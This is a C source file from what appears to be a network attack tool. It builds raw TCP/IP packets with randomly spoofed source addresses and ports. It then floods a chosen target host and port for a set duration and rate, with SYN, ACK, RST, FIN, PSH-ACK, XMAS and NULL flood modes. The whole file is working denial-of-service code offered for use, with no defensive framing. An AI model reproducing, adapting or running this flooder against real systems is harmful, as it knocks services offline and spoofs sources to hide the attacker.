#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <signal.h>	

#include "tung.h"
#include "logs.h"
#include "utils.h"

#define PACKET_LEN 1024

struct ethheader {
        uint8_t  ether_dhost[6]; /* Destination host address */
        uint8_t  ether_shost[6]; /* Source host address */
        uint16_t ether_type;     /* IP? ARP? RARP? etc */
};

struct ipheader {
        uint8_t  iph_ihl:4,      /* IP header length */
		 iph_ver:4;       /* IP version */
        uint8_t  iph_tos;        /* Type of service */
        uint16_t iph_len;        /* IP Packet length (data + header) */
        uint16_t iph_ident;      /* Identification */
        uint16_t iph_flag:3,     /* Fragmentation flags */
		 iph_offset:13;   /* Flags offset */
        uint8_t  iph_ttl;        /* Time to Live */
        uint8_t  iph_protocol;   /* Protocol type */
        uint16_t iph_chksum;     /* IP datagram checksum */
        struct in_addr iph_sourceip; /* Source IP address */
        struct in_addr iph_destip;   /* Destination IP address */
};

struct icmpheader {
        uint8_t  icmp_type;      /* ICMP message type */
        uint8_t  icmp_code;      /* Error code */
        uint16_t icmp_chksum;    /* Checksum for ICMP Header and data */
        uint16_t icmp_id;        /* Used for identifying request */
        uint16_t icmp_seq;       /* Sequence number */
};

struct udpheader {
        uint16_t udp_sport;      /* Source port */
        uint16_t udp_dport;      /* Destination port */
        uint16_t udp_ulen;       /* UDP length */
        uint16_t udp_sum;        /* UDP checksum */
};

struct tcpheader {
        uint16_t tcp_sport;      /* Source port */
        uint16_t tcp_dport;      /* Destination port */
        uint32_t tcp_seq;        /* Sequence number */
        uint32_t tcp_ack;        /* Acknowledgement number */
        uint8_t  tcp_offx2;      /* Data offset, rsvd */
#define TH_OFF(th) (((th)->tcp_offx2 & 0xf0) >> 4)
        uint8_t  tcp_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        uint16_t tcp_win;        /* Window */
        uint16_t tcp_sum;        /* Checksum */
        uint16_t tcp_urp;        /* Urgent pointer */
};

struct pseudo_tcp {
        uint32_t saddr, daddr;
        uint8_t  mbz;
        uint8_t  ptcl;
        uint16_t tcpl;
        struct tcpheader tcp;
        uint8_t  payload[1500];
};

typedef enum {
        FLOOD_SYN,
        FLOOD_ACK,
        FLOOD_RST,
        FLOOD_FIN,
        FLOOD_PSH_ACK,
        FLOOD_XMAS,
        FLOOD_NULL
} flood_type_t;

/* Helper function prototypes */
static int create_raw_socket(void);
static bool should_continue(time_t start, uint16_t duration);
static uint16_t calculate_tcp_checksum(struct ipheader *ip);
static uint16_t checksum(uint16_t *addr, int len);
static void setup_ip_header(struct ipheader *ip, const char *target, uint16_t packet_size);
static void setup_tcp_header(struct tcpheader *tcp, const char *port, uint8_t flags);
static void print_packet_info(struct ipheader *ip, struct tcpheader *tcp, uint64_t packet_count, time_t start_time);
static void perform_flood_attack(struct attack_opts_t *opts, flood_type_t type);

/* flood prototypes */
void syn_flood(struct attack_opts_t *opts);
void ack_flood(struct attack_opts_t *opts);
void rst_flood(struct attack_opts_t *opts);
void fin_flood(struct attack_opts_t *opts);
void psh_ack_flood(struct attack_opts_t *opts);
void xmas_flood(struct attack_opts_t *opts);
void null_flood(struct attack_opts_t *opts);

static int global_sock = -1;
static const char *global_typename = NULL;
static uint64_t global_packets_count = 0;

void handle_sigint(int sig) {
    (void)sig; 
    
    if (global_sock != -1) {
        close(global_sock);
    }

    printf("\n");
    LOG_INFO("TCP %s Flood interrupted (packets sent: %lu)", 
             global_typename ? global_typename : "UNKNOWN", global_packets_count);
    exit(0);
}

static int create_raw_socket(void) {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        int enable = 1;

        if (sockfd < 0) {
                LOG_ERROR("Error: Failed to initialize socket");
                perror("socket");
                exit(EXIT_FAILURE);
        }

        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
                LOG_ERROR("Error: Failed to set socket option IP_HDRINCL");
                perror("setsockopt");
                close(sockfd);
                exit(EXIT_FAILURE);
        }
        
        return sockfd;
}

static bool should_continue(time_t start, uint16_t duration) {
        return (time(NULL) - start) < duration;
}

static uint16_t calculate_tcp_checksum(struct ipheader *ip) {
        struct tcpheader *tcp = (struct tcpheader *)((uint8_t *)ip + (ip->iph_ihl * 4));
        
        if (ntohs(ip->iph_len) <= (ip->iph_ihl * 4)) {
                return 0;  /* Check underflow */
        }

        uint16_t tcp_len = ntohs(ip->iph_len) - (ip->iph_ihl * 4);

        struct pseudo_tcp pheader;
        memset(&pheader, 0, sizeof(pheader));

        pheader.saddr = ip->iph_sourceip.s_addr;
        pheader.daddr = ip->iph_destip.s_addr;
        pheader.mbz = 0;
        pheader.ptcl = IPPROTO_TCP;
        pheader.tcpl = htons(tcp_len);

        memcpy(&pheader.tcp, tcp, tcp_len);

        pheader.tcp.tcp_sum = 0;

        return checksum((uint16_t *)&pheader, sizeof(pheader.saddr) + sizeof(pheader.daddr) +
               sizeof(pheader.mbz) + sizeof(pheader.ptcl) + sizeof(pheader.tcpl) + tcp_len);
}

static uint16_t checksum(uint16_t *addr, int len) {
        uint32_t sum = 0;

        while (len > 1) {
                sum += *addr++;
                len -= 2;
        }

        if (len > 0) {
                sum += *(uint8_t *)addr;
        }

        while (sum >> 16) {
                sum = (sum & 0xFFFF) + (sum >> 16);
        }

        return (uint16_t)~sum;
}

static void setup_ip_header(struct ipheader *ip, const char *target, uint16_t packet_size) {
        ip->iph_ver = 4;                           /* IPv4 */
        ip->iph_ihl = 5;                           /* Standard IP header length */
        ip->iph_ttl = 50;                          /* Time to live */
        ip->iph_sourceip.s_addr = rand() ^ (rand() << 15) ^ (rand() << 30); /* Random source IP */
        ip->iph_destip.s_addr = inet_addr(target);
        ip->iph_protocol = IPPROTO_TCP;
        ip->iph_len = htons(packet_size);
}

static void setup_tcp_header(struct tcpheader *tcp, const char *port, uint8_t flags) {
        tcp->tcp_sport = rand();                   /* Random source port */
        tcp->tcp_dport = htons(atoi(port));
        tcp->tcp_seq = rand();                     /* Random sequence number */
        tcp->tcp_offx2 = 0x50;                     /* Data offset: 5 words (standard header) */
        tcp->tcp_flags = flags;
        tcp->tcp_win = htons(20000);               /* Window size */
        tcp->tcp_sum = 0;                          /* Will be calculated later */
}

static void print_packet_info(struct ipheader *ip, struct tcpheader *tcp, uint64_t packet_count, time_t start_time) {
        printf(COLOR_YELLOW "▸ Source IP:    " COLOR_BLUE "%-15s" COLOR_RESET, inet_ntoa(ip->iph_sourceip));
        printf(COLOR_YELLOW "  ▸ Source Port: " COLOR_BLUE "%d\n" COLOR_RESET, ntohs(tcp->tcp_sport));
        
        printf(COLOR_YELLOW "▸ Dest IP:      " COLOR_BLUE "%-15s" COLOR_RESET, inet_ntoa(ip->iph_destip));
        printf(COLOR_YELLOW "  ▸ Dest Port:   " COLOR_BLUE "%d\n" COLOR_RESET, ntohs(tcp->tcp_dport));
        
        printf(COLOR_YELLOW "▸ Sequence:     " COLOR_BLUE "0x%08x" COLOR_RESET, ntohl(tcp->tcp_seq));
        printf(COLOR_YELLOW "  ▸ Window Size: " COLOR_BLUE "%d\n" COLOR_RESET, ntohs(tcp->tcp_win));
        
        printf(COLOR_YELLOW "▸ IP Header:    " COLOR_BLUE "Version=%d" COLOR_RESET, ip->iph_ver);
        printf(COLOR_YELLOW ", IHL=%d" COLOR_RESET, ip->iph_ihl);
        printf(COLOR_YELLOW ", TTL=%d" COLOR_RESET, ip->iph_ttl);
        printf(COLOR_YELLOW ", Protocol=TCP (%d)\n" COLOR_RESET, ip->iph_protocol);
        
        printf(COLOR_YELLOW "▸ TCP Flags:    " COLOR_RESET);
        printf(COLOR_BLUE "%s%s%s%s%s%s%s%s\n" COLOR_RESET,
               (tcp->tcp_flags & TH_SYN)  ? "SYN " : "",
               (tcp->tcp_flags & TH_ACK)  ? "ACK " : "",
               (tcp->tcp_flags & TH_FIN)  ? "FIN " : "",
               (tcp->tcp_flags & TH_RST)  ? "RST " : "",
               (tcp->tcp_flags & TH_PUSH) ? "PSH " : "",
               (tcp->tcp_flags & TH_URG)  ? "URG " : "",
               (tcp->tcp_flags & TH_ECE)  ? "ECE " : "",
               (tcp->tcp_flags & TH_CWR)  ? "CWR " : "");
        
        printf(COLOR_YELLOW "▸ Checksum:     " COLOR_BLUE "0x%04x" COLOR_RESET, ntohs(tcp->tcp_sum));
        printf(COLOR_YELLOW "  ▸ Packet Size: " COLOR_BLUE "%d bytes\n\n" COLOR_RESET, ntohs(ip->iph_len));
        
        printf(COLOR_CYAN "[•] Packet #%-6lu " COLOR_YELLOW "Timestamp: " COLOR_BLUE "%.2fs\n" COLOR_RESET,
               packet_count, difftime(time(NULL), start_time));
}

static const char* get_flood_type_name(flood_type_t type) {
        switch (type) {
                case FLOOD_SYN:     return "SYN";
                case FLOOD_ACK:     return "ACK";
                case FLOOD_RST:     return "RST";
                case FLOOD_FIN:     return "FIN";
                case FLOOD_PSH_ACK: return "PSH-ACK";
                case FLOOD_XMAS:    return "XMAS";
                case FLOOD_NULL:    return "NULL";
                default:            return "Unknown";
        }
}

static uint8_t get_flood_flags(flood_type_t type) {
        switch (type) {
                case FLOOD_SYN:     return TH_SYN;
                case FLOOD_ACK:     return TH_ACK;
                case FLOOD_RST:     return TH_RST;
                case FLOOD_FIN:     return TH_FIN;
                case FLOOD_PSH_ACK: return TH_PUSH | TH_ACK;
                case FLOOD_XMAS:    return TH_FIN | TH_PUSH | TH_URG;
                case FLOOD_NULL:    return 0; /* No flags set */
                default:            return TH_SYN; /* Default to SYN */
        }
}

static void perform_flood_attack(struct attack_opts_t *opts, flood_type_t type) {
        check_root();
        
        const char *type_name = get_flood_type_name(type);
        uint8_t flags = get_flood_flags(type);

        LOG_INFO("Started TCP %s Flood attack to %s for %d seconds %s", 
                 type_name, opts->atk_target, opts->atk_duration, 
                 opt_verbose ? "(detailed packet info will be shown)" : "");

        printf(COLOR_YELLOW "▸ Attack type:" COLOR_RESET " TCP %s Flood\n", type_name);
        printf(COLOR_YELLOW "▸ Target:" COLOR_RESET " %s\n", opts->atk_target);
        printf(COLOR_YELLOW "▸ Port:" COLOR_RESET " %s\n", opts->atk_port);
        printf(COLOR_YELLOW "▸ Duration:" COLOR_RESET " %d seconds\n\n", opts->atk_duration);

        char buffer[PACKET_LEN];
        struct ipheader *ip = (struct ipheader *)buffer;
        struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));
        uint16_t packet_size = sizeof(struct ipheader) + sizeof(struct tcpheader);
        
        int sock = create_raw_socket();
        struct sockaddr_in dest_info;
        memset(&dest_info, 0, sizeof(dest_info));
        dest_info.sin_family = AF_INET;
        dest_info.sin_addr.s_addr = inet_addr(opts->atk_target);

        srand((unsigned int)time(NULL));
        time_t start = time(NULL);
        register uint64_t packets_count = 0;

	global_sock = sock;
	global_typename = type_name;
	global_packets_count = 0; 
	signal(SIGINT, handle_sigint);	
        
	while (should_continue(start, opts->atk_duration)) {
                memset(buffer, 0, PACKET_LEN);
                
                setup_ip_header(ip, opts->atk_target, packet_size);
                setup_tcp_header(tcp, opts->atk_port, flags);
                
                tcp->tcp_sum = calculate_tcp_checksum(ip);

                if (opt_verbose) {
                        print_packet_info(ip, tcp, packets_count, start);
                }
                
                if (sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0) {
                        LOG_ERROR("Failed to send packet: %s", strerror(errno));
                        break;
                }

                packets_count++;
		global_packets_count++;

		if(opts->atk_rate > 0) 
			usleep(1000000 / opts->atk_rate);
        }
        
        LOG_INFO("TCP %s Flood ended (packets sent: %lu)", type_name, packets_count);
        close(sock);
}

/* Public flood attacks */

void syn_flood(struct attack_opts_t *opts) {
        perform_flood_attack(opts, FLOOD_SYN);
}

void ack_flood(struct attack_opts_t *opts) {
        perform_flood_attack(opts, FLOOD_ACK);
}

void rst_flood(struct attack_opts_t *opts) {
        perform_flood_attack(opts, FLOOD_RST);
}

void fin_flood(struct attack_opts_t *opts) {
        perform_flood_attack(opts, FLOOD_FIN);
}

void psh_ack_flood(struct attack_opts_t *opts) {
        perform_flood_attack(opts, FLOOD_PSH_ACK);
}

void xmas_flood(struct attack_opts_t *opts) {
        perform_flood_attack(opts, FLOOD_XMAS);
}

void null_flood(struct attack_opts_t *opts) {
        perform_flood_attack(opts, FLOOD_NULL);
}
